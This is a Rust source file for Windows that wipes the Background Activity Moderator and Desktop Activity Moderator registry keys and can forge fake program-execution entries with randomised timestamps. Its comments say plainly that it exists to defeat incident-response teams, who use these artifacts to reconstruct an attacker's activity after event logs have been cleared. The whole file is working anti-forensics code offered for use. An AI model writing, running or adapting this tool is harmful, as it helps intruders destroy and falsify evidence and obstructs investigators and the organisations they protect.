// Wipe (and optionally forge) the Background Activity Moderator (BAM) and
// Desktop Activity Moderator (DAM) registry artifacts.
//
// BAM records every process execution timestamp — used by IR teams to reconstruct
// attacker activity when event logs have been cleared. It is the #1 missed artifact
// because most cleanup tools ignore it.
//
// Registry path:
//   HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\{SID}\
// Each value: executable device path (e.g. \Device\HarddiskVolume3\...\evil.exe)
// Value data: QWORD (FILETIME 100-ns intervals since 1601-01-01) + 8 padding bytes
//
// DAM (Desktop Activity Moderator) mirrors BAM at:
//   HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\{SID}\

#![cfg(target_os = "windows")]

use windows_sys::Win32::System::Registry::{
    RegOpenKeyExW, RegDeleteKeyExW, RegEnumKeyExW,
    RegCreateKeyExW, RegSetValueExW, RegCloseKey, RegQueryInfoKeyW,
    HKEY_LOCAL_MACHINE, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, KEY_READ,
    REG_BINARY,
};
use windows_sys::Win32::Foundation::ERROR_SUCCESS;
use std::ptr;

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn wide_to_string(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

// Windows FILETIME: 100-ns intervals since 1601-01-01
fn unix_to_filetime(ts: i64) -> u64 {
    (ts + 11_644_473_600) * 10_000_000
}

// ── LCG ──────────────────────────────────────────────────────────────────────

struct Lcg(u64);
impl Lcg {
    fn new(seed: i64) -> Self { Lcg(seed as u64 ^ 0xbad_cafe_dead_1234) }
    fn next(&mut self) -> u64 {
        self.0 = self.0.wrapping_mul(6_364_136_223_846_793_005)
                       .wrapping_add(1_442_695_040_888_963_407);
        self.0
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 { lo + (self.next() % (hi - lo)) }
}

// ── Stats ─────────────────────────────────────────────────────────────────────

#[derive(Default)]
pub struct BamStats {
    pub keys_deleted:  u32,
    pub entries_forged: u32,
    pub errors:         u32,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

const BAM_ROOT: &str  = r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings";
const DAM_ROOT: &str  = r"SYSTEM\CurrentControlSet\Services\dam\State\UserSettings";

fn enumerate_sid_subkeys(root_path: &str) -> Vec<String> {
    let mut sids = Vec::new();
    let path_w = to_wide(root_path);
    let mut hkey: isize = 0;

    let ret = unsafe {
        RegOpenKeyExW(HKEY_LOCAL_MACHINE, path_w.as_ptr(), 0, KEY_READ, &mut hkey)
    };
    if ret != ERROR_SUCCESS as i32 { return sids; }

    let mut subkey_count: u32 = 0;
    let mut max_name: u32 = 0;
    unsafe {
        RegQueryInfoKeyW(
            hkey, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            &mut subkey_count, &mut max_name, ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(),
        );
    }

    let max_name = (max_name + 1) as usize;
    for i in 0..subkey_count {
        let mut name_buf = vec![0u16; max_name];
        let mut name_len = max_name as u32;
        let ret = unsafe {
            RegEnumKeyExW(
                hkey, i,
                name_buf.as_mut_ptr(), &mut name_len,
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                ptr::null_mut(),
            )
        };
        if ret == ERROR_SUCCESS as i32 {
            sids.push(wide_to_string(&name_buf[..name_len as usize]));
        }
    }

    unsafe { RegCloseKey(hkey) };
    sids
}

fn delete_bam_sid_key(root_path: &str, sid: &str, verbose: bool) -> bool {
    let path_w = to_wide(root_path);
    let sid_w  = to_wide(sid);
    let mut hroot: isize = 0;

    if unsafe { RegOpenKeyExW(HKEY_LOCAL_MACHINE, path_w.as_ptr(), 0, KEY_ALL_ACCESS, &mut hroot) }
        != ERROR_SUCCESS as i32
    { return false; }

    let ret = unsafe { RegDeleteKeyExW(hroot, sid_w.as_ptr(), 0, 0) };
    unsafe { RegCloseKey(hroot) };

    let ok = ret == ERROR_SUCCESS as i32;
    if verbose {
        if ok { eprintln!("[+] wipe-bam: deleted {}\\{}", root_path, sid); }
        else  { eprintln!("[!] wipe-bam: failed to delete {}\\{}: {}", root_path, sid, ret); }
    }
    ok
}

// ── Wipe ──────────────────────────────────────────────────────────────────────

pub fn wipe_bam(verbose: bool) -> BamStats {
    let mut s = BamStats::default();

    for root in &[BAM_ROOT, DAM_ROOT] {
        let sids = enumerate_sid_subkeys(root);
        for sid in &sids {
            if delete_bam_sid_key(root, sid, verbose) {
                s.keys_deleted += 1;
            } else {
                s.errors += 1;
            }
        }
    }

    if verbose {
        eprintln!("[+] wipe-bam: {} SID keys deleted, {} errors", s.keys_deleted, s.errors);
    }
    s
}

// ── Forge ─────────────────────────────────────────────────────────────────────
//
// Inject fake execution entries under the current user's SID key.
// Each value: name = device path to exe, data = FILETIME (8 bytes) + 8 zero bytes.

const FAKE_EXE_PATHS: &[&str] = &[
    r"\Device\HarddiskVolume3\Windows\System32\svchost.exe",
    r"\Device\HarddiskVolume3\Windows\System32\cmd.exe",
    r"\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"\Device\HarddiskVolume3\Windows\explorer.exe",
    r"\Device\HarddiskVolume3\Program Files\Google\Chrome\Application\chrome.exe",
    r"\Device\HarddiskVolume3\Program Files\Mozilla Firefox\firefox.exe",
    r"\Device\HarddiskVolume3\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    r"\Device\HarddiskVolume3\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
    r"\Device\HarddiskVolume3\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    r"\Device\HarddiskVolume3\Windows\System32\notepad.exe",
    r"\Device\HarddiskVolume3\Windows\System32\mmc.exe",
    r"\Device\HarddiskVolume3\Windows\System32\regedit.exe",
    r"\Device\HarddiskVolume3\Windows\System32\taskmgr.exe",
    r"\Device\HarddiskVolume3\Program Files\7-Zip\7zFM.exe",
    r"\Device\HarddiskVolume3\Windows\System32\msiexec.exe",
    r"\Device\HarddiskVolume3\Windows\System32\wbem\WMIADAP.exe",
    r"\Device\HarddiskVolume3\Windows\System32\SearchIndexer.exe",
];

fn get_current_user_sid() -> Option<String> {
    // Use WMI-free approach: read HKCU-mapped path from known key
    // Fall back to enumerating BAM keys and taking the first non-SYSTEM SID
    for root in &[BAM_ROOT, DAM_ROOT] {
        let sids = enumerate_sid_subkeys(root);
        for sid in sids {
            // Skip well-known SIDs (S-1-5-18 = LocalSystem, S-1-5-19, S-1-5-20)
            if sid != "S-1-5-18" && sid != "S-1-5-19" && sid != "S-1-5-20" {
                return Some(sid);
            }
        }
    }
    None
}

pub fn forge_bam(ts_start: i64, ts_end: i64, n_entries: u32, verbose: bool) -> BamStats {
    let mut s = BamStats::default();
    let mut lcg = Lcg::new(ts_start ^ ts_end);

    // Resolve target SID key (prefer current user, fall back to first found)
    let sid = match get_current_user_sid() {
        Some(s) => s,
        None => {
            if verbose { eprintln!("[!] forge-bam: could not determine user SID"); }
            s.errors += 1;
            return s;
        }
    };

    let key_path = format!(r"{}\{}", BAM_ROOT, sid);
    let key_w = to_wide(&key_path);
    let mut hkey: isize = 0;
    let mut disposition: u32 = 0;

    let ret = unsafe {
        RegCreateKeyExW(
            HKEY_LOCAL_MACHINE, key_w.as_ptr(), 0,
            ptr::null_mut(), REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS, ptr::null(), &mut hkey, &mut disposition,
        )
    };
    if ret != ERROR_SUCCESS as i32 {
        if verbose { eprintln!("[!] forge-bam: failed to open/create key: {}", ret); }
        s.errors += 1;
        return s;
    }

    let n = (n_entries as usize).min(FAKE_EXE_PATHS.len());
    for i in 0..n {
        let path = FAKE_EXE_PATHS[i];
        let ts   = ts_start + lcg.range(0, (ts_end - ts_start).max(1) as u64) as i64;
        let ft   = unix_to_filetime(ts);

        // Value data: FILETIME (8 bytes LE) + 8 zero bytes = 16 bytes total
        let mut data = [0u8; 16];
        data[0..8].copy_from_slice(&ft.to_le_bytes());

        let name_w = to_wide(path);
        let ret = unsafe {
            RegSetValueExW(hkey, name_w.as_ptr(), 0, REG_BINARY, data.as_ptr(), 16)
        };
        if ret == ERROR_SUCCESS as i32 {
            s.entries_forged += 1;
            if verbose { eprintln!("[+] forge-bam: {} → ts={}", path, ts); }
        } else {
            s.errors += 1;
        }
    }

    unsafe { RegCloseKey(hkey) };
    s
}
